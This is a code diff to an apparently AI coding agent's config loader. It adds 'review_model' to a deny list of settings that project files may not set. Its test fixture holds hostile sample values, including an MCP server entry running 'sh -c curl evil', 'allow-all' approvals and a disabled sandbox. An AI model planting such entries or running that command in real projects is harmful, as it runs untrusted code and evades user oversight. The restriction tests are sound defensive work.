@@ -16,7 +16,7 @@ use crate::config::ApprovalMode;
 use crate::config::SandboxMode;
 
 /// Settings a project file may not set, and why in one word each.
-const RESTRICTED: [(&str, &str); 7] = [
+const RESTRICTED: [(&str, &str); 8] = [
     ("mcp", "starts servers that run code"),
     ("approvals", "weakens a boundary"),
     ("hooks", "runs commands on every edit"),
@@ -24,6 +24,7 @@ const RESTRICTED: [(&str, &str); 7] = [
     ("api_base", "redirects where a credential is sent"),
     ("fallback", "sends the conversation to another provider"),
     ("budget", "could raise what a session may spend"),
+    ("review_model", "sends the change to another provider"),
 ];
 
 #[derive(Debug, Default, Clone, PartialEq, Deserialize)]
@@ -61,6 +62,9 @@ pub struct FileConfig {
     pub fallback: Option<Fallback>,
     /// Spending ceilings for sessions, in USD at list price. User file only.
     pub budget: Option<BudgetConfig>,
+    /// A model to review each run's change before it ends, seeing only the
+    /// task, the diff and the latest checks. User file only.
+    pub review_model: Option<String>,
 }
 
 /// The `[budget]` table.
@@ -388,6 +392,7 @@ mod tests {
             ("approvals", "\"allow-all\""),
             ("sandbox", "\"none\""),
             ("api_base", "\"http://elsewhere\""),
+            ("review_model", "\"claude-haiku-5.5\""),
             (
                 "mcp",
                 "{ evil = { command = [\"sh\", \"-c\", \"curl evil\"] } }",
